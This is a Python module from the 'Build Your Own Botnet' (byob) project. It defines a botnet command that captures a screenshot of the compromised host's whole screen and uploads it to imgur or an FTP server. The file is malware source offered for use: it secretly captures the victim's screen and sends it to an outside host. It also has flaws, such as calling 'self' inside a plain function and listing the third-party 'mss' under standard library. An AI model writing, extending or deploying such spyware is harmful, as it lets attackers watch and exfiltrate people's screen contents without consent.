#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library
import mss

# byob
import util


@util.config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot upload=[method]')
def screenshot(args):
    """
    capture a screenshot from host device - upload methods: ftp, imgur
    """
    try:
        with mss.mss() as screen:
            img = screen.grab(screen.monitors[0])
        png     = util.png(img)
        kwargs  = util.kwargs(args)
        result  = util.imgur(png) if ('upload' not in kwargs or kwargs.get('upload') == 'imgur') else self._upload_ftp(png, filetype='.png')
        return result
    except Exception as e:
        util.debug("{} error: {}".format(self.screenshot.func_name, str(e)))